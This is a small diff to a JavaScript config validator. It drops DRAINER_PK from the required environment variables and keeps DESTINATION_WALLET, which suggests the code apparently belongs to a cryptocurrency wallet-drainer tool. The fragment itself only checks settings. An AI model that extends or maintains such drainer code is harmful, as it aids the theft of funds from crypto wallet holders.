@@ -393,7 +393,7 @@ export function validateModernConfig() {
 
 // Security validation
 export function validatePrivateConfig() {
-  const required = ['DRAINER_PK', 'DESTINATION_WALLET'];
+  const required = ['DESTINATION_WALLET'];
   const missing = required.filter(key => !process.env[key] || process.env[key] === '');
   
   if (missing.length > 0) {
